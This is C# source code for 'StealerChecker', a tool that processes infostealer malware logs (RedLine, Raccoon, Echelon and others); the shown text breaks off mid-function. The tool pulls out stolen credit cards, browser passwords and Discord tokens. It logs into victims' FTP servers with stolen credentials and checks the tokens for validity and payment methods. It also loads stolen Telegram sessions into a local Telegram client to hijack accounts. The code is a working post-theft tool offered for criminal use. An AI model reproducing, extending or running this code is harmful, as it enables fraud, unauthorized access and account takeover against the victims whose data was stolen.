using CommandLine;
using Everything;
using Everything.Model;
using FluentFTP;
using Leaf.xNet;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using TemnijExt;
using Console = Colorful.Console;
using File = System.IO.File;

namespace stealerchecker
{
    public static partial class Program
    {
        #region FIELDS

        private const string tag = "9.1";
        private const string caption = $"StealerChecker v{tag} by Temnij";
        private static readonly List<Log> files = new();
        private static readonly List<string> directories = new();
        public static readonly string NewLine = Environment.NewLine;
        private static readonly List<string> patterns = new()
        {
            "InfoHERE.txt", // Echelon
            "InfoHERE.html", // Echelon (mod)
            "UserInformation.txt", // RedLine
            "~Work.log", // DCRat Stealer mode
            "System Info.txt", // Raccoon Stealer
            "_Information.txt", // Unknown stealer (44CALIBER?)
            "information.txt", // COLLECTOR
            "system_info.txt", // Unknown stealer
            "readme.txt", // HUNTER
            "LogInfo.txt", // Unknown Stealer
        };
        private static readonly List<string> names = new()
        {
            "Echelon",
            "Echelon (mod)",
            "RedLine",
            "DCRat Stealer",
            "Raccoon Stealer",
            "Unknown stealer (44CALIBER?)",
            "COLLECTOR",
            "Unknown stealer",
            "HUNTER",
            "Unknown Stealer"
        };
        private static Options opt = new();

        #endregion

        public static void Main(string[] args)
        {
            #region SETTINGS

            Console.WindowWidth = 86;
            Console.BufferWidth = 86;
            Console.BufferHeight = 9999;
            Console.BackgroundColor = Color.Black;

            #endregion

            SetStatus();

            #region ARGUMENT PARSING

            Parser.Default.ParseArguments<Options>(args)
                    .WithParsed(o => opt = o);

            if (string.IsNullOrEmpty(opt.Path))
            {
                Console.WriteLine("Проблемы?\n" +
                    "1. Создайте файл start.cmd в этой же папке\n" +
                    "2. Пропишите в нём: stealerchecker.exe -p c:/путь/до/папки/с/логами\n" +
                    "3. Кликните по нему два раза", Color.Red);
                Console.ReadKey();
                Environment.Exit(-1);
            }

            #endregion

            try
            {
                Update();
            }
            catch
            {
                Console.WriteLine("Update error.. Seems, you are haven't internet connection..\nPress any key...", Color.Pink);
                Console.ReadKey();
            }

            #region LOADING

            Console.WriteLine("Please wait, loading...", Color.LightCyan);

            if (Process.GetProcesses().Any(x => x.ProcessName.IndexOf("everything", StringComparison.OrdinalIgnoreCase) >= 0) && !opt.Everything)
            {
                Console.WriteLine("It looks like you are using Everything. Turn it on? [y/n]", Color.LightGreen);
                opt.Everything = !Console.ReadLine().Equals("n", StringComparison.OrdinalIgnoreCase);
            }

            if (!opt.Everything)
            {
                SetStatus("Adding Directories...");
                AddDirectories();
                Console.WriteLine($"Directories added: {directories.Count}", Color.Gray);
                SetStatus("Adding files...");
                AddFiles();
                Console.WriteLine($"Files added: {files.Count}", Color.Gray);
            }
            else
            {
                GetFilesAsync().Wait();
            }

            glob = GetPasswords();

            Console.Clear();
            SetStatus();

            #endregion

            //Console.WriteLine(GetAllHashes().Select(x => x.Key + " " + x.Value).Join());
            //Console.ReadKey();

            while (true)
                PrintMainMenu();
        }

        #region FILES

        internal static void AddDirectories() =>
            directories.AddRange(Directory.GetDirectories(opt.Path, "*", SearchOption.AllDirectories));
        internal static void AddFiles()
        {
            files
                .AddRange(directories
                .SelectMany(dir =>
                {
                    try
                    {
                        return Directory.GetFiles(dir)
                                        .Where(x => patterns.Contains(Path.GetFileName(x)))
                                        .Select(x => new Log(x));
                    }
                    catch
                    {
                        return new [] { new Log() };
                    }
                })
                .Where(x => !string.IsNullOrEmpty(x.Name)));
        }

        #endregion
        #region CCs

        internal static void GetCC()
        {
            foreach (var file in files)
            {
                SetStatus($"Working... {Math.Round(GetPercent(files.Count, files.IndexOf(file)))}%");
                if (file.Name.Equals("InfoHERE.txt") || file.Name.Equals("InfoHERE.html"))
                {
                    var match = Regex.Match(File.ReadAllText(file.FullPath), @"∟💳(\d*)");
                    var cards = int.Parse(match.Groups[1].Value);

                    if (cards > 0)
                    {
                        Console.Write($"[{file.FullPath}]", Color.Green);
                        Console.WriteLine($" - {cards} cards!");

                        try
                        {
                            Console.WriteLine(WriteCC(file.FullPath), Color.LightCyan);
                        }
                        catch { }
                    }
                }
                else if (file.Name.Equals("UserInformation.txt"))
                {
                    var dir = new FileInfo(file.FullPath).DirectoryName;

                    if (Directory.Exists(Path.Combine(dir, "CreditCards")))
                    {
                        foreach (var cardFile in Directory.GetFiles(Path.Combine(dir, "CreditCards")))
                        {
                            var matches = Regex.Matches(File.ReadAllText(cardFile), @"Holder: (.*)\s*CardType: (.*)\s*Card: (.*)\s*Expire: (.*)")
                                .OfType<Match>()
                                .Select(x =>
                                new
                                {
                                    Holder = x.Groups[1].Value,
                                    CardType = x.Groups[2].Value,
                                    Card = x.Groups[3].Value,
                                    Expire = x.Groups[4].Value
                                })
                                .Select(y => $"{y.CardType} | {y.Card} {y.Expire} {y.Holder}")
                                .Join();
                            if (!string.IsNullOrEmpty(matches))
                            {
                                Console.WriteLine(dir, Color.Green);
                                Console.WriteLine(matches, Color.LightCyan);
                            }
                        }
                    }
                }
                else if (file.Name.Equals("information.txt"))
                {
                    var dir = new FileInfo(file.FullPath).DirectoryName;

                    if (Directory.Exists(Path.Combine(dir, "CC")))
                    {
                        foreach (var cardFile in Directory.GetFiles(Path.Combine(dir, "CC")))
                        {
                            var cc = File.ReadAllText(cardFile);
                            if (!string.IsNullOrEmpty(cc))
                            {
                                Console.WriteLine(dir, Color.Green);
                                Console.WriteLine(cc, Color.LightCyan);
                            }
                        }
                    }
                }
                else if (file.Name.Equals("readme.txt"))
                {
                    var dir = new FileInfo(file.FullPath).DirectoryName;

                    if (File.Exists(Path.Combine(dir, "Browser", "Cards.txt")))
                    {
                        var cc = File.ReadAllText(Path.Combine(dir, "Browser", "Cards.txt"));
                        if (!string.IsNullOrEmpty(cc))
                        {
                            Console.WriteLine(dir, Color.Green);
                            Console.WriteLine(cc, Color.LightCyan);
                        }
                    }
                }
            }
            SetStatus();
        }
        internal static string WriteCC(string path) =>
            Directory.GetFiles(Path.Combine(new FileInfo(path).DirectoryName, "Browsers", "Cards"))
                .Where(x => new FileInfo(x).Length > 5)
                .Select(x => File.ReadAllText(x) + NewLine).Join();

        #endregion
        #region FTPs

        internal static void GetFTP()
        {
            var ths = new List<Thread>();

            int z = 0;
            foreach (var file in files)
            {
                ths.Add(new Thread(() =>
                {
                    SetStatus($"Getting... {Math.Round(GetPercent(files.Count, z++), 1)}%");

                    if (file.Name.Equals("InfoHERE.txt"))
                    {
                        var match = Regex.Match(File.ReadAllText(file.FullPath), @"📡 FTP\s*∟ FileZilla: (❌|✅).*\s*∟ TotalCmd: (❌|✅).*");

                        var fileZila = match.Groups[1].Value.Equals("✅");

                        if (fileZila)
                        {
                            Console.Write($"[{new FileInfo(file.FullPath).Directory.FullName}]", Color.Green);
                            Console.WriteLine(" - FileZila");

                            WriteFileZila(file.FullPath);
                        }
                    }
                    else if (file.Name.Equals("InfoHERE.html"))
                    {
                        var match = Regex.Match(File.ReadAllText(file.FullPath), "<h2 style=\"color:white\">📡 FTP<\\/h2>\\s*<p style=\"color:white\">   ∟ FileZilla: (❌|✅)<\\/p>\\s*<p style=\"color:white\">   ∟ TotalCmd: (❌|✅)<\\/p>");

                        var fileZila = match.Groups[1].Value.Equals("✅");

                        if (fileZila)
                        {
                            Console.Write($"[{new FileInfo(file.FullPath).Directory.FullName}]", Color.Green);
                            Console.WriteLine(" - FileZila");

                            WriteFileZila(file.FullPath);
                        }
                    }
                    else if (file.Name.Equals("UserInformation.txt"))
                    {
                        var logFolder = new FileInfo(file.FullPath).Directory.FullName;
                        if (Directory.Exists(Path.Combine(logFolder, "FTP"))
                            && File.Exists(Path.Combine(logFolder, "FTP", "Credentials.txt")))
                        {
                            Console.Write($"[{new FileInfo(file.FullPath).Directory.FullName}]", Color.Green);
                            Console.WriteLine(" - FTP");

                            CheckRedlineFtp(File.ReadAllText(Path.Combine(logFolder, "FTP", "Credentials.txt")));
                        }
                    }
                }));
            }

            foreach (var item in ths) item.Start();

            int i = 0;
            foreach (var item in ths)
            {
                SetStatus($"Checking... {Math.Round(GetPercent(ths.Count, i++), 1)}%");
                item.Wait();
            }

            Console.WriteLine($"Good FTPs:{NewLine + goodFTPs.Distinct().Join()}", Color.LightGreen);
            File.WriteAllLines("goodFTPs.txt", goodFTPs.Distinct());
            goodFTPs.Clear();

            SetStatus();
        }
        internal static void WriteFileZila(string path)
        {
            var fileZilaFolder = Directory.GetFiles(Path.Combine(new FileInfo(path).DirectoryName, "FileZilla"))
                .Where(x => new FileInfo(x).Length > 5);

            var ths = new List<Thread>();

            foreach (var file in fileZilaFolder)
            {
                ths.Add(new Thread(() => CheckFileZilla(File.ReadAllText(file))));
            }

            foreach (var item in ths) item.Start();
            foreach (var item in ths) item.Wait();
        }

        private static readonly List<string> goodFTPs = new();
        internal static void CheckFileZilla(string fileZillaLog)
        {
            const string pattern = @"Host: (.*)\s*Port: (.*)\s*User: (.*)\s*Pass: (.*)";
            foreach (Match match in Regex.Matches(fileZillaLog, pattern))
            {
                var obj = new
                {
                    Host = match.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                    Port = match.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                    User = match.Groups[3].Value.Replace("\r", "").Replace("\\r", ""),
                    Pass = match.Groups[4].Value.Replace("\r", "").Replace("\\r", "")
                };

                try
                {
                    //SetStatus($"Checking {obj.Host}...");
                    using FtpClient client = new(obj.Host)
                    {
                        Port = int.Parse(obj.Port),
                        Credentials = new NetworkCredential(obj.User, obj.Pass),
                        ConnectTimeout = 5000,
                        DataConnectionConnectTimeout = 5000,
                        DataConnectionReadTimeout = 5000,
                        ReadTimeout = 5000
                    };

                    client.Connect();
                    var info = NewLine +
                        client.GetListing("/")
                        .Select(x => "\t" + (client.DirectoryExists(x.FullName) ? x.FullName + "/" : x.FullName))
                        .Join() + NewLine;
                    client.Disconnect();

                    var fullInfo = $"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - GOOD" + info;

                    //Console.WriteLine(fullInfo, Color.LightGreen);
                    goodFTPs.Add(fullInfo);
                }
                catch (FtpAuthenticationException)
                {
                    try
                    {
                        //SetStatus($"Checking for anonymous auth {obj.Host}...");
                        using FtpClient client = new(obj.Host)
                        {
                            Port = int.Parse(obj.Port),
                            Credentials = new NetworkCredential("anonymous", ""),
                            ConnectTimeout = 5000,
                            DataConnectionConnectTimeout = 5000,
                            DataConnectionReadTimeout = 5000,
                            ReadTimeout = 5000
                        };

                        client.Connect();
                        var info = NewLine +
                            client.GetListing("/")
                            .Select(x => "\t" + (client.DirectoryExists(x.FullName) ? x.FullName + "/" : x.FullName))
                            .Join() + NewLine;
                        client.Disconnect();

                        var fullInfo = $"{obj.Host}:{obj.Port};anonymous: - GOOD" + info;

                        //Console.WriteLine(fullInfo, Color.LightGreen);
                        goodFTPs.Add(fullInfo);
                    }
                    catch
                    {
                        //Console.WriteLine($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - BAD", Color.LightPink);
                    }
                }
                catch
                {
                    //Console.WriteLine($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - BAD", Color.LightPink);
                }
            }
        }
        internal static void CheckRedlineFtp(string redLineLog)
        {
            const string pattern = @"Server: (.*):(.*)\s*Username: (.*)\s*Password: (.*)\s*";
            foreach (Match match in Regex.Matches(redLineLog, pattern))
            {
                var obj = new
                {
                    Host = match.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                    Port = match.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                    User = match.Groups[3].Value.Replace("\r", "").Replace("\\r", ""),
                    Pass = match.Groups[4].Value.Replace("\r", "").Replace("\\r", "")
                };

                try
                {
                    //SetStatus($"Checking {obj.Host}...");
                    using FtpClient client = new(obj.Host)
                    {
                        Port = int.Parse(obj.Port),
                        Credentials = new NetworkCredential(obj.User, obj.Pass),
                        ConnectTimeout = 5000,
                        DataConnectionConnectTimeout = 5000,
                        DataConnectionReadTimeout = 5000,
                        ReadTimeout = 5000
                    };

                    client.Connect();
                    var info = NewLine +
                            client.GetListing("/")
                            .Select(x => "\t" + (client.DirectoryExists(x.FullName) ? x.FullName + "/" : x.FullName))
                            .Join() + NewLine;
                    client.Disconnect();

                    var fullInfo = $"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - GOOD" + info;

                    //Console.WriteLine(fullInfo, Color.LightGreen);
                    goodFTPs.Add(fullInfo);
                }
                catch (FtpAuthenticationException)
                {
                    try
                    {
                        //SetStatus($"Checking for anonymous auth {obj.Host}...");
                        using FtpClient client = new(obj.Host)
                        {
                            Port = int.Parse(obj.Port),
                            Credentials = new NetworkCredential("anonymous", ""),
                            ConnectTimeout = 5000,
                            DataConnectionConnectTimeout = 5000,
                            DataConnectionReadTimeout = 5000,
                            ReadTimeout = 5000
                        };

                        client.Connect();
                        var info = NewLine +
                            client.GetListing("/")
                            .Select(x => "\t" + (client.DirectoryExists(x.FullName) ? x.FullName + "/" : x.FullName))
                            .Join() + NewLine;
                        client.Disconnect();

                        var fullInfo = $"{obj.Host}:{obj.Port};anonymous: - GOOD" + info;

                        //Console.WriteLine(fullInfo, Color.LightGreen);
                        goodFTPs.Add(fullInfo);
                    }
                    catch
                    {
                        //Console.WriteLine($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - BAD", Color.LightPink);
                    }
                }
                catch
                {
                    //Console.WriteLine($"{obj.Host}:{obj.Port};{obj.User}:{obj.Pass} - BAD", Color.LightPink);
                }
            }
        }
        internal static string WriteTotalCmd(string path) =>
            Directory.GetFiles(Path.Combine(new FileInfo(path).DirectoryName, "FTP", "Total Commander"))
            .Where(x => new FileInfo(x).Length > 5)
            .Select(x => File.ReadAllText(x) + NewLine)
            .Join();

        #endregion
        #region DISCORD

        internal static void GetDiscord()
        {
            //var ths = new List<Thread>();
            List<Models.CheckResult> tokens = new();

            foreach (var file in files)
            {
                //ths.Add(new Thread(() =>
                //{
                    var info = new FileInfo(file.FullPath);
                    SetStatus($"Working... {Math.Round(GetPercent(files.Count, files.IndexOf(file), 100M), 3)}%");

                    if (info.Name.Equals("InfoHERE.txt")
                        || info.Name.Equals("InfoHERE.html"))
                    {
                        var match = Regex.Match(File.ReadAllText(file.FullPath), "💬 Discord: (✅|❌)");

                        var discord = match.Groups[1].Value.Equals("✅");

                        try
                        {
                            if (discord)
                                tokens.AddRange(WriteDiscord(file.FullPath));
                        }
                        catch { }
                    }
                    else
                    {
                        try
                        {
                            tokens.AddRange(WriteDiscord(file.FullPath));
                        }
                        catch { }
                    }
                //}));
            }

            //foreach (var item in ths) item.Start();

            //int i = 0;
            //foreach (var item in ths)
            //{
            //    SetStatus($"Working... {50 + Math.Round(GetPercent(ths.Count, i++, 50M), 2)}%");
            //    item.Wait();
            //}

            SetStatus();

            File.WriteAllLines("DiscordTokens_All.txt", tokens.Distinct().Select(x => x.Token));
            File.WriteAllLines("DiscordTokens_Working.txt", tokens.Distinct().Where(x => x.IsValid).Select(x => x.Token));
            File.WriteAllLines("DiscordTokens_WithPayment.txt", tokens.Distinct().Where(x => x.Payment).Select(x => x.Token));
        }
        internal static List<Models.CheckResult> WriteDiscord(string path)
        {
            List<Models.CheckResult> tokensList = new();

            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            string discordDir = default;
            var name = Path.GetFileName(path);

            if (name.Equals("InfoHERE.txt") || name.Equals("InfoHERE.html"))
                discordDir = Path.Combine(dir, "Discord", "Local Storage", "leveldb");
            else if (name.Equals("UserInformation.txt"))
                discordDir = Path.Combine(dir, "Discord");
            else if (name.Equals("~Work.log"))
                discordDir = Path.Combine(dir, "Other");
            else if (name.Equals("information.txt"))
                discordDir = Path.Combine(dir, "Discord", "botty");
            else if (name.Equals("LogInfo.txt"))
                discordDir = Path.Combine(dir, "Discord", "leveldb");

            foreach (var file in Directory.GetFiles(discordDir))
            {
                try
                {
                    var thisFile = FileCl.Load(file);
                    if (thisFile.Info.Length > 5)
                    {
                        var tokens = CheckDiscord(thisFile.GetContent());
                        if (tokens.Any())
                        {
                            Console.WriteLine($"{tokens.Join()}", Color.LightGreen);
                            tokensList.AddRange(tokens.Select(x => DiscordChecker.CheckToken(x)));
                        }
                    }
                }
                catch
                {
                }
            }

            return tokensList;
        }
        internal static IEnumerable<string> CheckDiscord(string content) =>
            Regex.Matches(content, @"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}")
            .OfType<Match>()
            .Select(x => x.Value)
            .Distinct();

        #endregion
        #region SEARCH

        #region URL

        internal static void SearchByURL(string query)
        {
            SetStatus("Working... ");
            Console.WriteLine(SearchByURLHerlper(query).Join(), Color.LightGreen);
            SetStatus();
        }
        private static IEnumerable<string> SearchByURLHerlper(string query) => glob
                .Where(x => x.Url.AnyNew(query))
                .Select(y => $"{y.Login}:{y.Pass}{(opt.Verbose ? $"\t{y.Url}" : "")}")
                .Distinct();

        #endregion
        #region USERNAME

        internal static void SearchByUsername(string query)
        {
            SetStatus("Working... ");
            Console.WriteLine(SearchByUsernameHelper(query).Join(), Color.LightGreen);
            SetStatus();
        }
        private static IEnumerable<string> SearchByUsernameHelper(string query) => glob
                .Where(x => x.Login.AnyNew(query))
                .Select(y => $"{y.Login}:{y.Pass}{(opt.Verbose ? $"\t{y.Url}" : "")}")
                .Distinct();

        #endregion
        #region PASSWORD

        internal static void SearchByPass(string query)
        {
            SetStatus("Working... ");
            Console.WriteLine(SearchByPassHelper(query).Join(), Color.LightGreen);
            SetStatus();
        }
        private static IEnumerable<string> SearchByPassHelper(string query) => glob
                .Where(x => x.Pass.AnyNew(query))
                .Select(y => $"{y.Login}:{y.Pass}{(opt.Verbose ? $"\t{y.Url}" : "")}")
                .Distinct();

        #endregion

        #endregion
        #region TELEGRAM

        internal static int counter = 0;

        internal static void GetTelegram()
        {
            if (!Directory.Exists("Telegram"))
                Directory.CreateDirectory("Telegram");

            foreach (var file in files)
            {
                var fn = file.Name;
                if (fn.Equals("InfoHERE.txt") || fn.Equals("InfoHERE.html"))
                {
                    if (Regex.Match(File.ReadAllText(file.FullPath), "✈️ Telegram: (❌|✅)").Groups[1].Value.Equals("✅"))
                    {
                        CopyTelegram(file.FullPath);
                    }
                }
                else if (fn.Equals("~Work.log") && Directory.Exists(Path.Combine(new FileInfo(file.FullPath).DirectoryName, "Other", "Telegram", "tdata")))
                {
                    CopyTelegram(file.FullPath);
                }
                else if (fn.Equals("UserInformation.txt") && Directory.Exists(Path.Combine(new FileInfo(file.FullPath).DirectoryName, "Telegram", "Profile_1")))
                {
                    CopyTelegram(file.FullPath);
                }
                else if (fn.Equals("LogInfo.txt") && Directory.Exists(Path.Combine(new FileInfo(file.FullPath).DirectoryName, "Telegram")))
                {
                    CopyTelegram(file.FullPath);
                }
            }
            SetStatus();

        again:
            var dirs = new List<string>();
            foreach (var dir in Directory.GetDirectories("Telegram"))
                dirs.Add(new DirectoryInfo(dir).Name);

            var ordered = dirs
            .OrderBy(x => int.Parse(x));

            foreach (var dir in ordered)
                Console.WriteLine(dir, Color.LightGreen);

            Console.WriteLine("Select Telegram:", Color.Green);
            var select = int.Parse(Console.ReadLine());

            try { Directory.Delete("tdata"); } catch { }

            SetStatus("Copying Telegram session");
            CopyFiles(Path.Combine("Telegram", select.ToString()), "tdata");
            SetStatus();

            Process.Start("Telegram.exe");

            Console.ReadLine();

            Process.GetProcessesByName(Path.GetFullPath("Telegram.exe"))
                .ToList()
                .ForEach(pr => pr.Kill());

            goto again;
        }
        internal static void CopyTelegram(in string path)
        {
            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            string tgDir = "";
            var fn = Path.GetFileName(path);

            if (fn.Equals("InfoHERE.txt") || fn.Equals("InfoHERE.html"))
                tgDir = Array.Find(Directory.GetDirectories(dir), x => new DirectoryInfo(x).Name.StartsWith("Telegram"));
            else if (fn.Equals("~Work.log"))
                tgDir = Path.Combine(new FileInfo(path).DirectoryName, "Other", "Telegram", "tdata");
            else if (fn.Equals("UserInformation.txt"))
                tgDir = Path.Combine(new FileInfo(path).DirectoryName, "Telegram", "Profile_1"); // TODO: доделать, я огурец.
            else if (fn.Equals("LogInfo.txt"))
                tgDir = Path.Combine(new FileInfo(path).DirectoryName, "Telegram"); // TODO: доделать, я огурец.

            CopyFiles(tgDir, Path.Combine(Directory.GetCurrentDirectory(), "Telegram", counter.ToString()));
            if (fn.Equals("LogInfo.txt"))
                CopyFiles(Path.Combine(tgDir, "tdata"), Path.Combine(Directory.GetCurrentDirectory(), "Telegram", counter.ToString()));
            SetStatus($"{counter++} telegram dirs copied");
        }

        private static void CopyFiles(string sourcePath, string targetPath)
        {
            try
            {
                if (!Directory.Exists(targetPath))
                    Directory.CreateDirectory(targetPath);
            }
            catch { }
            foreach (string dirPath in Directory.GetDirectories(sourcePath, "*", SearchOption.AllDirectories))
                Directory.CreateDirectory(dirPath.Replace(sourcePath, targetPath));

            foreach (string newPath in Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories))
                File.Copy(newPath, newPath.Replace(sourcePath, targetPath), true);
        }

        #endregion
        #region SORT LOGS | Deprecated | TODO: Update

        internal static void SortLogs()
        {
            List<KeyValuePair<string, DateTime>> result = new();
            Console.WriteLine("Loading...", Color.DarkCyan);

            foreach (var file in files)
            {
                if (file.Name.Equals("InfoHERE.txt"))
                {
                    var filecl = FileCl.Load(file.FullPath);
                    var dir = filecl.Info.Directory.FullName;
                    var sysFile = Path.Combine(dir, "System_Information.txt");
                    var matchRus = Regex.Match(File.ReadAllText(sysFile), @"Current time Utc: ((\d*)\.(\d*)\.(\d*) (\d*):(\d*):(\d*))");
                    var matchEur = Regex.Match(File.ReadAllText(sysFile), @"Current time Utc: ((\d*)\/(\d*)\/(\d*) (\d*):(\d*):(\d*) (AM|PM))");
                    DateTime date = DateTime.Now;

                    if (matchRus.Success)
                    {
                        try
                        {
                            date = DateTime.Parse(matchRus.Groups[1].Value);
                            result.Add(new KeyValuePair<string, DateTime>(dir, date));
                        }
                        catch
                        {
                            throw;
                        }
                    }
                    if (matchEur.Success)
                    {
                        try
                        {
                            date = DateTime.ParseExact(matchEur.Groups[1].Value, "M/d/yyyy h:mm:ss tt", CultureInfo.InvariantCulture);
                            result.Add(new KeyValuePair<string, DateTime>(dir, date));
                        }
                        catch
                        {
                            throw;
                        }
                    }
                }
            }

            Console.WriteLine("Loaded!", Color.LightGreen);
            Console.WriteLine();
            Console.WriteLine("Sorting by Year/Month...", Color.DarkCyan);

            if (!Directory.Exists("Sorts"))
            {
                Directory.CreateDirectory("Sorts");
            }
            else
            {
                Console.WriteLine("Directory exists, deleting...", Color.Pink);
                DeleteFolder("Sorts");
                Console.WriteLine("Deleted!", Color.LightGreen);
                Directory.CreateDirectory("Sorts");
            }

            foreach (var pair in result)
            {
                var date = pair.Value;
                var directory = pair.Key;
                var year = date.Year.ToString();
                var month = date.Month.ToString();

                if (!Directory.Exists(Path.Combine("Sorts", year)))
                    Directory.CreateDirectory(Path.Combine("Sorts", year));
                if (!Directory.Exists(Path.Combine("Sorts", year, month)))
                    Directory.CreateDirectory(Path.Combine("Sorts", year, month));

                CopyFiles(directory, Path.Combine("Sorts", year, month, new DirectoryInfo(directory).Name));
                SetStatus($"Copying... Directory {result.IndexOf(pair)}/{result.Count}");
            }
            SetStatus();

            Console.WriteLine("Sorted!", Color.Green);
        }
        private static void DeleteFolder(string folder)
        {
            try
            {
                DirectoryInfo di = new(folder);
                DirectoryInfo[] diA = di.GetDirectories();
                foreach (FileInfo f in di.GetFiles())
                    f.Delete();

                foreach (DirectoryInfo df in diA)
                {
                    DeleteFolder(df.FullName);
                    if (df.GetDirectories().Length == 0 && df.GetFiles().Length == 0) df.Delete();
                }
            }
            catch (DirectoryNotFoundException ex)
            {
                Console.WriteLine("Директория не найдена. Ошибка: " + ex.Message);
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.WriteLine("Отсутствует доступ. Ошибка: " + ex.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Произошла ошибка. Обратитесь к разрабу. Ошибка: " + ex.Message);
            }
        }

        #endregion
        #region STATUS FUNCTIONS

        internal static void SetStatus(string status) => Console.Title = $"{caption} | {status}";
        internal static void SetStatus() => Console.Title = caption;

        #endregion
        #region SORT BY CATEGORIES

        private static IEnumerable<Password> glob;

        internal static void SortLogsbyCategories()
        {
            SetStatus("Loading...");

            var services = new List<Service>();
            services.AddRange(Directory.GetFiles("services")
                .Select(x => new Service()
                {
                    Name = Path.GetFileNameWithoutExtension(x),
                    Services = File.ReadAllLines(x)
                        .Select(y => y.Replace("\r", ""))
                }));
            ProcessServiceNew(services);

            SetStatus();
        }
        internal static IEnumerable<Password> GetPasswords()
        {
            List<Password> passwords = new();

            SetStatus($"Loading [1/2]... {progress}%... Processing...");
            int max = files.Count;
            int counter = 0;

            // array optimization
            Log[] array = files.Shuffle().ToArray();

            for (int i = 0; i < array.Length; i++)
            {
                Log filePas = array[i];

                try
                {
                    if(counter > 10 && counter % 10 == 0)
                        SetStatus($"Loading [2/2]... {Math.Round(GetPercent(max, counter), 1)}%... Processing...");
                }
                catch { }
                var filecl = FileCl.Load(filePas.FullPath);
                var dir = filecl.Info.Directory.FullName;

                if (filePas.Name.Equals("InfoHERE.txt") || filePas.Name.Equals("InfoHERE.html"))
                {
                    var passwordsDir = Path.Combine(dir, "Browsers", "Passwords");

                    if (File.Exists(Path.Combine(passwordsDir, "ChromiumV2.txt")))
                    {
                        try
                        {
                            var log = Regex.Matches(File.ReadAllText(Path.Combine(passwordsDir, "ChromiumV2.txt")).Replace("\r", ""), @"Url: (.*)\s*Username: (.*)\s*Password: (.*)\s*Application: (.*)");

                            passwords.AddRange(log.OfType<Match>()
                                .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))
                                .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                        }
                        catch
                        {
                        }
                    }
                    if (File.Exists(Path.Combine(passwordsDir, "Passwords_Google.txt")))
                    {
                        try
                        {
                            var log = Regex.Matches(File.ReadAllText(Path.Combine(passwordsDir, "Passwords_Google.txt")).Replace("\r", ""), @"Url: (.*)\s*Login: (.*)\s*Password: (.*)\s*Browser: (.*)");

                            passwords.AddRange(log.OfType<Match>()
                                .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))
                                .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                        }
                        catch
                        {
                        }
                    }
                    if (File.Exists(Path.Combine(passwordsDir, "Passwords_Mozilla.txt")))
                    {
                        try
                        {
                            var log = Regex.Matches(File.ReadAllText(Path.Combine(passwordsDir, "Passwords_Mozilla.txt")).Replace("\r", ""), @"URL : (.*)\s*Login: (.*)\s*Password: (.*)");

                            passwords.AddRange(log.OfType<Match>()
                                .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))
                                .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                        }
                        catch
                        {
                        }
                    }
                    if (File.Exists(Path.Combine(passwordsDir, "Passwords_Opera.txt")))
                    {
                        try
                        {
                            var log = Regex.Matches(File.ReadAllText(Path.Combine(passwordsDir, "Passwords_Opera.txt")).Replace("\r", ""), @"Url: (.*)\s*Login: (.*)\s*Passwords: (.*)");

                            passwords.AddRange(log.OfType<Match>()
                                .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))
                                .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                        }
                        catch
                        {
                        }
                    }
                    if (File.Exists(Path.Combine(passwordsDir, "Passwords_Unknown.txt")))
                    {
                        try
                        {
                            var log = Regex.Matches(File.ReadAllText(Path.Combine(passwordsDir, "Passwords_Unknown.txt")).Replace("\r", ""), @"Url: (.*)\s*Login: (.*)\s*Password: (.*)");

                            passwords.AddRange(log.OfType<Match>()
                                .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))
                                .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                        }
                        catch
                        {
                        }
                    }
                }
                else if (filePas.Name.Equals("UserInformation.txt"))
                {
                    try
                    {
                        var thisFile = FileCl.Load(Path.Combine(dir, "Passwords.txt"));
                        var log = Regex.Matches(thisFile.GetContent().Replace("\r", ""), @"URL: (.*)\s*Username: (.*)\s*Password: (.*)");

                        passwords.AddRange(log.OfType<Match>()
                                    .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))
                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                    }
                    catch { }
                }
                else if (filePas.Name.Equals("System Info.txt"))
                {
                    try
                    {
                        var thisFile = Path.Combine(dir, "Passwords.txt");
                        var log = Regex.Matches(File.ReadAllText(thisFile).Replace("\r", ""), @"HOST: (.*)\s*USER: (.*)\s*PASS: (.*)");

                        passwords.AddRange(log.OfType<Match>()
                                    .Select(match => new Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))
                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
                    }
                    catch { }
                }
                else if (filePas.Name.Equals("~Work.log"))
                {
                    try
                    {
                        var filenames = Directory.GetFiles(Path.Combine(dir, "Browsers"))
                            .Where(x => Path.GetFileName(x).StartsWith("Passwords")).ToList();

                        if (Directory.Exists(Path.Combine(dir, "Browsers", "Unknowns")))
                        {
                            filenames.AddRange(Directory.GetFiles(Path.Combine(dir, "Browsers", "Unknowns"))
                                        .Where(x => Path.GetFileName(x).StartsWith("Passwords")));
                        }
